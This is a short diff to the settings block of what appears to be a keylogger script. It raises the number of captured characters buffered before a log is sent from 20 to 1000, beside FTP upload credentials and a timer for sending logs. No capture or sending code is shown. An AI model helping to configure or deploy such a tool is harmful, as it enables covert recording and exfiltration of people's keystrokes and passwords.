@@ -30,7 +30,7 @@ strFtpUser = ""
 strFtpPass = ""
 strFtpRemotePath = "/"
 
-intCharPerSend = 20  # set num of chars before send log/store
+intCharPerSend = 1000  # set num of chars before send log/store
 
 blnUseTime = "False"  # if you prefer to use a timer to send/save logs, set this to True
 intTimePerSend = 120  # set how often to send/save logs in seconds
